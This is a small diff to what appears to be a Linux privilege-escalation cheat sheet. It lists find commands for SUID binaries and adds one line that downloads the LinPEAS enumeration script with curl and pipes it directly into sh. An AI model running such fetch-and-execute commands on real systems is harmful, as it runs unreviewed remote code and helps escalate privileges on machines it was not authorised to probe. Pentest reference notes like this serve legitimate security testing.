@@ -52,6 +52,7 @@
 `find / -perm -u=s -type f 2>/dev/null`<br>
 `find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null`<br>
 `find / -perm -u=s -type f 2>/dev/null`<br>
+`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`<br>
 
 Also use LinPEAS or LinENUM
 
